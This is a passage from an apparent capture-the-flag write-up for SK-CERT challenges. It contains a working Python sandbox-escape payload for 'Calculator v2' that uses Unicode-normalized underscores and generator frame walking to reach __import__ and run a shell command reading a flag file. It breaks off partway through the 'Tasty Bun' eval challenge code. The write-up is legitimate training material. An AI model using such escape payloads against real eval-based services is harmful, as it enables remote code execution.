</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">99</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="n">term1</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">term2</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x2C</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">term1</span> <span class="o">+</span> <span class="n">term2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">        <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xfc</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="p">])</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="n">s2_buf</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">        <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x3c</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">    <span class="p">])</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="n">t1</span> <span class="o">=</span> <span class="n">s1</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s1:&#34;</span><span class="p">,</span> <span class="n">t1</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">62</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s1_ascii:&#34;</span><span class="p">,</span> <span class="n">t1</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s1 decode error:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">
</span></span><span class="line"><span class="ln">67</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">
</span></span><span class="line"><span class="ln">69</span><span class="cl">    <span class="n">t2</span> <span class="o">=</span> <span class="n">s2</span><span class="p">(</span><span class="n">s2_buf</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s2:&#34;</span><span class="p">,</span> <span class="n">t2</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">        <span class="n">s2_ascii</span> <span class="o">=</span> <span class="n">t2</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">73</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s2_ascii:&#34;</span><span class="p">,</span> <span class="n">s2_ascii</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;s2 decode error:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">76</span><span class="cl">
</span></span><span class="line"><span class="ln">77</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">78</span><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p><img src="https://gist.github.com/user-attachments/assets/5191c34f-5ac4-43b1-b10e-ff2d21842f95" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{br1n6_y0ur_0wn_l1bc}
</span></span></code></pre></div><h2 id="jaile2">JAILE2</h2>
<h3 id="calculator-v2">Calculator v2</h3>
<p>Description</p>
<blockquote>
<p>A new version of The Calculator came out! Can you check if itâ€™s secure?
<code>exp.cybergame.sk:7011</code></p></blockquote>
<p>Challenge</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">import</span> <span class="nx">math</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">def</span> <span class="nx">handle_client</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="nx">print</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="s2">&#34;Welcome to the Calculator v2!\nWith improved security so you can have access to all the fun math stuff and the bad guys cannot do the bad stuff! Enjoy :D&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="err">#</span> <span class="nx">We</span> <span class="nx">added</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">prevent</span> <span class="nx">the</span> <span class="nx">user</span> <span class="nx">from</span> <span class="nx">calling</span> <span class="nx">dangerous</span> <span class="nx">functions</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nx">safe_globals</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="s2">&#34;__builtins__&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="s2">&#34;sin&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">sin</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="s2">&#34;cos&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">cos</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="s2">&#34;tan&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">tan</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="s2">&#34;asin&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">asin</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s2">&#34;acos&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">acos</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s2">&#34;atan&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">atan</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="s2">&#34;sqrt&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="s2">&#34;pow&#34;</span><span class="o">:</span> <span class="nx">math</span><span class="p">.</span><span class="nx">pow</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="s2">&#34;abs&#34;</span><span class="o">:</span> <span class="nx">abs</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;round&#34;</span><span class="o">:</span> <span class="nx">round</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s2">&#34;min&#34;</span><span class="o">:</span> <span class="nx">min</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s2">&#34;max&#34;</span><span class="o">:</span> <span class="nx">max</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s2">&#34;sum&#34;</span><span class="o">:</span> <span class="nx">sum</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="nx">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">while</span> <span class="nx">text</span> <span class="o">!=</span> <span class="s2">&#34;exit&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nx">text</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="err">#</span> <span class="nx">In</span> <span class="nx">all</span> <span class="nx">ctf</span> <span class="nx">writeups</span> <span class="nx">they</span> <span class="nx">use</span> <span class="nx">_</span> <span class="nx">or</span> <span class="nx">its</span> <span class="nx">unicode</span> <span class="nx">equivalent</span> <span class="nx">to</span> <span class="nx">somehow</span> <span class="nx">escape</span> <span class="nx">the</span> <span class="nx">jail</span><span class="p">.</span> <span class="nx">No</span> <span class="nx">_</span> <span class="nx">means</span> <span class="nx">no</span> <span class="nx">fun</span> <span class="k">for</span> <span class="nx">them</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">for</span> <span class="nx">character</span> <span class="k">in</span> <span class="p">[</span><span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;ï¼¿&#34;</span><span class="p">]</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">if</span> <span class="nx">character</span> <span class="k">in</span> <span class="nx">text</span><span class="p">.</span><span class="nx">lower</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">                <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;Not allowed, killing\n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">                <span class="nx">text</span> <span class="o">=</span> <span class="s2">&#34;lol&#34;</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">try</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nx">print</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span> <span class="nx">safe_globals</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="nx">except</span> <span class="nx">Exception</span> <span class="nx">as</span> <span class="nx">e</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;Error: &#34;</span> <span class="o">+</span> <span class="nx">str</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nx">def</span> <span class="nx">main</span><span class="p">()</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="nx">handle_client</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="nx">main</span><span class="p">()</span>
</span></span></code></pre></div><p>Solution</p>
<p>The challenge was basically a Python sandbox, but with a twist. It uses <code>eval()</code> to evaluate user input, but it wraps it in a restricted <code>safe_globals</code> dict that only exposes a few safe functions mostly math stuff like <code>sin</code>, <code>cos</code>, <code>sqrt</code>, <code>abs</code>, <code>round</code>, and so on. No access to <code>eval</code>, <code>exec</code>, <code>open</code>, or even <code>__builtins__</code> directly.</p>
<p>But the real kicker is this it blocks <strong>any</strong> use of the underscore character (<code>_</code>) even the full-width Unicode one (<code>ï¼¿</code>). And if youâ€™ve done any Python sandbox stuff before, you know thatâ€™s brutal. All the classic tricks rely on double underscores: <code>__class__</code>, <code>__subclasses__</code>, <code>__globals__</code>, etc. So with <code>_</code> banned, all the usual escape routes are cut off.</p>
<p>So whatever payload youâ€™re building has to work <strong>without typing <code>_</code> at all</strong>. Thatâ€™s what makes this challenge spicy  you have to find clever ways to build those dunders without ever writing them directly.</p>
<h4 id="dealing-with-_-restrictions-via-unicode-normalization">Dealing with <code>_</code> Restrictions via Unicode Normalization</h4>
<p>One of the main restrictions in this challenge is that you cannot use the underscore character (<code>_</code>) directly  nor its full-width Unicode equivalent (<code>ï¼¿</code>). This is enforced by checking the user input string and terminating if any variant appears. However, Python internally normalizes many Unicode characters under the hood, and we can take advantage of this using <a href="https://docs.python.org/3/library/unicodedata.html">NFKC normalization</a></p>
<p>To find all Unicode characters that normalize to <code>_</code> I ran this simple script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">unicodedata</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65537</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">if</span> <span class="n">unicodedata</span><span class="o">.</span><span class="n">normalize</span><span class="p">(</span><span class="s2">&#34;NFKC&#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
</span></span></code></pre></div><p>This helps identify characters that <strong>look different</strong> but will be interpreted as <code>_</code> internally by Python once normalized.</p>
<hr>
<h4 id="frame-walking-without-_">Frame Walking Without <code>_</code></h4>
<p>With <code>_</code> completely off the table, I needed a way to access powerful objects like <code>__import__</code>, but without writing any underscores at all.</p>
<p>The trick was to use <strong>generator introspection</strong> to access Pythonâ€™s internal frames. From there, you can walk up the call stack and eventually reach the built-in namespace. Here&rsquo;s the payload I crafted:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">[</span><span class="n">y</span> <span class="o">:=</span> <span class="p">[],</span> 
</span></span><span class="line"><span class="ln">2</span><span class="cl"> <span class="n">y</span><span class="o">.</span><span class="n">extend</span><span class="p">([(</span><span class="n">x</span><span class="o">.</span><span class="n">gi</span><span class="err">ï¸´</span><span class="n">frame</span><span class="o">.</span><span class="n">f</span><span class="err">ï¸´</span><span class="n">back</span><span class="o">.</span><span class="n">f</span><span class="err">ï¸´</span><span class="n">back</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">y</span><span class="p">)]),</span> 
</span></span><span class="line"><span class="ln">3</span><span class="cl"> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">y</span><span class="p">[</span><span class="mi">0</span><span class="p">]][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">f</span><span class="err">ï¸´</span><span class="n">builtins</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flag*&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()]</span>
</span></span></code></pre></div><p>A breakdown:</p>
<ul>
<li>
<p><code>y := []</code> initializes an empty list</p>
</li>
<li>
<p>I use a generator expression to capture frames: <code>x.giï¸´frame.fï¸´back.fï¸´back</code></p>
</li>
<li>
<p>The character <code>ï¸´</code> (U+FE34) is <strong>not</strong> technically an underscore, but under Unicode normalization (<code>NFKC</code>), Python interprets it as one.</p>
</li>
<li>
<p>Then I access <code>fï¸´builtins</code> and use a hex escape: <code>'\x5f\x5fimport\x5f\x5f'</code> to call <code>__import__</code> without triggering the input filter.</p>
</li>
<li>
<p>The rest is a standard file read using <code>os.popen</code>.</p>
</li>
</ul>
<p>This works because the generator&rsquo;s <code>gi_frame</code> gives you access to the current frame object, and walking <code>f_back</code> lets you move up the stack. Once you reach the top, you can access the global <code>__builtins__</code> object and import anything you want</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__}
</span></span></code></pre></div><h3 id="tasty-bun">Tasty Bun</h3>
<p>Description</p>
<blockquote>
<p>The Tasty Bun bakery asked us for a pentest. Can you find a vulnerability in their baking software?</p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env bun
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="ch"></span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kr">const</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;net&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kr">const</span> <span class="nx">bake</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ingredients</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">return</span> <span class="kr">await</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">ingredients</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="kr">const</span> <span class="nx">hasValidIngredients</span> <span class="o">=</span> <span class="p">(</span><span class="nx">recipe</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="kr">const</span> <span class="nx">FORBIDDEN_INGREDIENTS</span> <span class="o">=</span> <span class="sr">/[()\/\[\];&#34;&#39;_!]/</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">FORBIDDEN_INGREDIENTS</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">recipe</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;ðŸ¥– These ingredients will spoil our bun!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="kr">const</span> <span class="nx">flavors</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="kr">const</span> <span class="nx">tasteProfile</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">recipe</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="kr">const</span> <span class="nx">ingredient</span> <span class="o">=</span> <span class="nx">recipe</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">flavors</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">ingredient</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">tasteProfile</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">ingredient</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">      <span class="nx">tasteProfile</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ingredient</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">tasteProfile</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">      <span class="s2">&#34;ðŸž Too many flavors will ruin the bun! Found &#34;</span> <span class="o">+</span> <span class="nx">tasteProfile</span><span class="p">.</span><span class="nx">length</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="kr">const</span> <span class="nx">bakery</span> <span class="o">=</span> <span class="nx">net</span><span class="p">.</span><span class="nx">createServer</span><span class="p">((</span><span class="nx">customer</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;ðŸ¥ A hungry customer has arrived at the bakery!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">  <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;tasty-bun&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">  <span class="nx">customer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">order</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">try</span> <span class="p">{</span>
